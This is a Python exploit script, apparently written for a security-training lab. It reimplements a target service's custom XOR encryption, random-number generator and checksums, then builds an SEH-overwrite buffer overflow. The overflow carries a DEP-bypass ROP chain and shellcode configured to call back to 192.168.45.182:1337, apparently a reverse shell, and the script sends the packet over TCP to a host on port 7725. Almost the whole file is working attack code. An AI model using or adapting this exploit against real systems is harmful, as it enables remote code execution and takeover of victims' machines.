import sys, socket, struct, ctypes

from shellcode import get_shellcode
from utils import RopChain, sanity_check
from dep_snowcra5h import SnowCrashDEP

bad_chars = [0, 0xa, 0xd, 0x2b, 0x25, 0x26, 0x3d]

DEBUG       = False
LOW_QWORD   = 1
HIGH_QWORD  = 0

qword_9ED208 = [0, 0] # dq 009ed208 L1 ; global stored here this is the global rand value


def print_debug(ENCRYPTED):
    count = 0
    for i in ENCRYPTED:
        if count % 16 == 0:
            print(f"{count:04}:\t\t", end = "")
        count = count + 1
        print(f"{hex(i)[2:]:2}", end = "")
        if count % 16 == 0:
            print("")
        elif count % 8 == 0:
            print("", end = "-")
        else:
            print("", end = " ")
    print("...")


def seed_rng(seed_value):
    global qword_9ED208
    qword_9ED208[HIGH_QWORD] = seed_value
    qword_9ED208[LOW_QWORD] = 0
    return __get_next_rng()


def __get_next_rng():
    global qword_9ED208
    qword_9ED208[HIGH_QWORD] = ctypes.c_uint32(qword_9ED208[HIGH_QWORD] * 0x15A4E35 + 1).value
    return (qword_9ED208[HIGH_QWORD] >> 16) & 0x7FFF


def get_large_random():
    global qword_9ED208

    EDX = EAX = ESI = EBX = EDX = ECX = 0
    EBX = ctypes.c_uint32(qword_9ED208[LOW_QWORD]).value    # mov ebx, dword ptr qword_9ED208+4
    ESI = ctypes.c_uint32(qword_9ED208[HIGH_QWORD]).value   # mov esi, dword ptr qword_9ED208
    EAX = EBX                                               # mov eax, ebx
    ECX = ctypes.c_uint32(0x15A).value                      # mov ecx, 15Ah
    EBX = ctypes.c_uint32(0x4E35).value                     # mov ebx, 4E35h
    if EAX != 0:
        EDX = ctypes.c_uint32((EAX * EBX) >> 32).value
        EAX = ctypes.c_uint32(EAX * EBX).value
    temp = ctypes.c_uint32(EAX).value                       # xchg eax, ecx
    EAX  = ctypes.c_uint32(ECX).value                       # xchg eax, ecx
    ECX  = ctypes.c_uint32(temp).value                      # xchg eax, ecx
    EDX  = ctypes.c_uint32((EAX * ESI) >> 32).value         # Store high bits in EDX for multiplication
    EAX  = ctypes.c_uint32(EAX * ESI).value                 # mul esi
    EAX  = ctypes.c_uint32(EAX + ECX).value                 # add eax, ecx
    temp = ctypes.c_uint32(EAX).value                       # xchg eax, esi
    EAX  = ctypes.c_uint32(ESI).value                       # xchg eax, esi
    ESI  = ctypes.c_uint32(temp).value                      # xchg eax, esi
    EDX  = ctypes.c_uint32((EAX * EBX) >> 32).value         # Store high bits in EDX for multiplication
    EAX  = ctypes.c_uint32(EAX * EBX).value                 # mul ebx
    EDX  = ctypes.c_uint32(EDX + ESI).value                 # add edx, esi
    SF   = ctypes.c_uint8(int(bool((EAX+1) & 0x80000000))).value      # sign flag
    EAX  = ctypes.c_uint32(EAX + 1).value                             # add eax, 1
    CF   = ctypes.c_uint8(int(bool((EAX+1) & 0x80000000)) ^ SF).value # carry flag
    EDX  = ctypes.c_uint32(EDX + CF).value                  # adc edx, 0
    EBX  = ctypes.c_uint32(EAX).value                       # mov ebx, eax
    ESI  = ctypes.c_uint32(EDX).value                       # mov esi, edx
    qword_9ED208[HIGH_QWORD] = ctypes.c_uint32(EBX).value   # mov dword ptr qword_9ED208, ebx
    qword_9ED208[LOW_QWORD]  = ctypes.c_uint32(ESI).value   # mov dword ptr qword_9ED208+4, esi
    EAX = ctypes.c_uint32(ESI).value                        # mov eax, esi
    EAX = ctypes.c_uint32(EAX & 0x7fffffff).value           # and eax, 7fffffffh
    ESI = EBX = 0                                           # For debugging
    return EAX


def decrypt_bytes(BUFFER_LEN, BUFFER, SEED_VALUE=0x037ba4d4):
    global EDX_GLOBAL

    if BUFFER_LEN == 0:
        return

    STORED_BUFFER = list(BUFFER)    # Convert bytes to list of integers
    XOR_KEY = 0
    
    seed_rng(SEED_VALUE)    # call seed_rng
    for i in range(BUFFER_LEN):
        XOR_KEY = ctypes.c_uint8(get_large_random() % 256).value
        XOR_VAL = ctypes.c_uint8(STORED_BUFFER[i]).value
        STORED_BUFFER[i] = ctypes.c_uint8(XOR_KEY ^ XOR_VAL).value

        if DEBUG:
            print(f'[{i:04}]: {hex(XOR_VAL)[2:]:02} ^ {hex(XOR_KEY)[2:]:02} = {hex(STORED_BUFFER[i])[2:]:02}')

    return bytes(STORED_BUFFER)  # Convert back to bytes


def generate_checksum_value(checkval):
    EDI = ESI = EBX = EDX = ECX = EAX = 0
    EAX = ctypes.c_uint32(checkval).value           # mov eax, dword ptr [ebp+0ch]
    ECX = ctypes.c_uint16(0x00b1).value             # mov ecx, 0b1h
    EDX = 0                                         # xor edx, edx
    EDX = ctypes.c_uint32(EAX % ECX).value          # EDX = remainder
    EAX = ctypes.c_uint32(int(EAX / ECX)).value     # EAX = dividend and quotient
    ECX = ctypes.c_int32(EDX * 0x00ab).value        # imul ecx, edx, 0abh
    EAX = ctypes.c_uint32(checkval).value           # mov eax, dword ptr [ebp+0ch]
    EBX = ctypes.c_uint16(0x00b1).value             # mov ebx, 0b1h
    EDX = 0                                         # xor edx, edx
    EDX = ctypes.c_uint32(EAX % EBX).value          # EDX = remainder
    EAX = ctypes.c_uint32(int(EAX / EBX)).value     # EAX = quotient && dividend
    EAX = ctypes.c_uint32(EAX + EAX).value          # add eax, eax
    ECX = ctypes.c_uint32(ECX - EAX).value          # sub ecx, eax 
    result = ECX                                    # mov dword ptr [ebp+result], ecx
    AX = ctypes.c_uint16(result).value              # mov ax, word ptr [ebp - 4]
    AX = ctypes.c_uint16(AX & 0x7fff).value         # and ax, 7fffh
    EAX = ctypes.c_uint32(EAX & 0xFFFF0000).value   # ... test val
    EAX = ctypes.c_uint32(EAX | AX).value           # ... test val
    return AX                                       # retn


def deobfuscate_buffer_with_checksum(initial_checksum, buffer, buffer_len):
    if buffer_len == 0:
        return buffer

    buf = list(buffer) # Convert bytes to list of integers

    checksum = generate_checksum_value(initial_checksum)

    for i in range(buffer_len):
        checksum = generate_checksum_value(checksum)
        buf[i] = ctypes.c_uint8(buf[i] ^ checksum).value

    return bytes(buf) # Convert back to bytes


def ps_command_buffer_checksum(buffer, size):
    EBX = buffer # base pointer for memory addresses pointing to buffer 
    EAX = 0      # accumulator return value
    ECX = 0      # counter for loop

    for ECX in range (size):
        EAX = ctypes.c_int32(EAX << 4).value    # shl eax, 4
        EDX = 0                                 # xor edx, edx
        EDX = ctypes.c_uint8(EBX[ECX]).value    # mov dl, [ebx]
        EAX = ctypes.c_uint32(EAX+EDX).value    # add eax, edx
        EDX = EAX                               # mov edx, eax
        EDX = EDX & 0xF0000000                  # and edx, 0xf0000000
        if EDX != 0:
            ESI = EDX                               # mov esi, edx
            ESI = ESI >> 24                         # shr esi, 18h
            EAX = ctypes.c_uint32(EAX^ESI).value    # xor eax, esi
        EDX = ctypes.c_uint32(~EDX).value       # not edx
        EAX = ctypes.c_uint32(EAX&EDX).value    # and eax, edx

    return ctypes.c_int32(EAX).value

def get_rop_chain() -> bytes:
    dep = SnowCrashDEP()

    return dep.BuildRopChainWriteProcessMemoryHprocessAndLpBaseAddress()
    
def get_seh_overwrite(header_sz, payload_sz) -> bytes:
    ip = "192.168.45.182"
    port = "1337"

    total_len = payload_sz - header_sz
    offset_to_eip = 3756
    offset_to_rop_gadgets = 530

    seh_chain  = b'A' * offset_to_rop_gadgets
    seh_chain += struct.pack("<L", 0x776be3)    # rop gadgets
    seh_chain += b'A' * ( (offset_to_eip - 4) - len(seh_chain) ) 
    seh_chain += b'\xEB\x28\x90\x90' # nseh
    seh_chain += struct.pack("<L", 0x63deae) # seh - ppr or similar
    seh_chain += b"\x90" * 100
    seh_chain += get_shellcode(ip, port, DEBUG)
    seh_chain += b'\x90' * (total_len - len(seh_chain))

    return seh_chain


def tcp_recv(client: socket):
    response = client.recv(4096) 
    print('[*] response:\n')
    print(response.hex())


def send_exploit(buffer: bytes, target_host, target_port, udp = False):

    if udp:
        print("[+] Creating UDP Socket")
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.sendto(buffer, (target_host, target_port))
        print(f'[+] sent {len(buffer)} bytes')

        resp, addr = client.recvfrom(4096)
        print('[*] response:\n')
        print(resp)

    else:
        print("[+] Creating TCP Socket")
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_host, target_port))

        # we need to get the initial blob of what ever the server is sending
        n_reads = 2
        while n_reads:
            tcp_recv(client)
            n_reads -= 1

        print(f"[+] Server Awaits Data")

        client.send(buffer)
        print(f'[+] sent {len(buffer)} bytes')

        client.send(buffer)
        tcp_recv(client)


def build_payload():
    cb_command_buffer = 7100

    NUMBER_OF_OPCODES = 4
    BYTES_PER_OPCODE  = 4
    SZ = (NUMBER_OF_OPCODES * BYTES_PER_OPCODE) + cb_command_buffer

    ps_command_header =  struct.pack("<L", 0x44444444)  # no clue
    ps_command_header += struct.pack("<L", 0x14)        # This is the offset of memory where we have our buffer
    ps_command_header += struct.pack("<L", 0x0A958)     # This is the third checksum
    ps_command_header += struct.pack("<L", 0x0C9)       # OPCODE FOUR used as the opcode for branching

    sz = struct.pack("<L", SZ)
    ps_command_header += sz

    payload = sz + get_seh_overwrite(len(ps_command_header), cb_command_buffer)

    ps_command_buffer = ps_command_header + payload

    ps_command_buffer = ps_command_buffer[4:]
    ps_command_buffer = list(ps_command_buffer)
    cbuf_checksum = ps_command_buffer_checksum(ps_command_buffer, cb_command_buffer - 4)
    ps_command_buffer = struct.pack("<L", cbuf_checksum) + bytes(ps_command_buffer)

    # total length minus the size of this checksum. 
    cb_buffer = struct.pack('>L', SZ) # does not get encoded; szEverything

    # cb_command_buffer
    cb_command_agent = SZ - cb_command_buffer # used as an offset to the ps_command_buffer

    # header
    encode = struct.pack("<L", 0x010795ef)              # checksum needed by second encryption
    cb_header = struct.pack("<L", cb_command_agent)     # cb_header + cb_buffer need to == cb_buffer
    checksum = struct.pack("<L", 0x0000A953)            # checksum value that comes after the encryption routines
    cb_com_buf = struct.pack("<L", cb_command_buffer)   # 3 values are checked in an if statement after the encryption
    ps_command_agent = encode + cb_header + checksum + cb_com_buf

    # commandBuffer
    buffer = ps_command_agent + ps_command_buffer
 
    # encryption phase one
    buf = buffer[4:]
    icvec = buf[:4]
    buf_len = len(buf)
    initial_checksum = ctypes.c_uint32(
            icvec[3] << 24 | icvec[2] << 16 | icvec[1] << 8 | icvec[0] << 0
        ).value
    phase_one_encrypted = deobfuscate_buffer_with_checksum(initial_checksum, buf, buf_len)

    # encryption phase two
    buf = struct.pack("<L", initial_checksum) + phase_one_encrypted
    phase_two_encrypted = decrypt_bytes(len(buf), buf)

    payload = cb_buffer + phase_two_encrypted

    if DEBUG:
        print("\nps_command_agent")
        print_debug(ps_command_agent)
        print("end: ps_command_agent\n")

        print("\nps_command_buffer")
        print_debug(ps_command_buffer)
        print("end: ps_command_buffer\n")

        print("phase_one_encrypted")
        print(f"checksum:\t{hex(initial_checksum)}")
        print_debug(phase_one_encrypted)
        print("enc: phase_one_encrypted\n")

        print("phase_two_encrypted")
        print_debug(phase_two_encrypted)
        print("end phase_two_encrypted\n")

        print("payload")
        print_debug(payload )
        print("end payload") 
        
        print(f"checkvalue: {hex(cbuf_checksum)}")

    return payload


def main():
    ip = '192.168.207.10'
    port = 7725

    send_exploit(build_payload(), ip, port, False)

if __name__ == '__main__':
    main()
